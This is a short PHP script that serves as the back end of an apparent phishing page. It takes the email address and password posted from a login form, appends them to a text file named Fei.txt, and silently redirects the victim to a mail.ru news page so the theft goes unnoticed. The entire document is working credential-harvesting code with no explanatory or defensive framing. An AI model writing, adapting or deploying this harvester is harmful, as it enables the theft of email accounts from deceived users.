<?PHP
$Log = $_POST['log'];
$Pass =$_POST['pas'];
$log = fopen("Fei.txt","at");
fwrite($log,"Mail - $Log|Pass- $Pass|\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://wf.mail.ru/news/1001323.html'></head></html>";
?>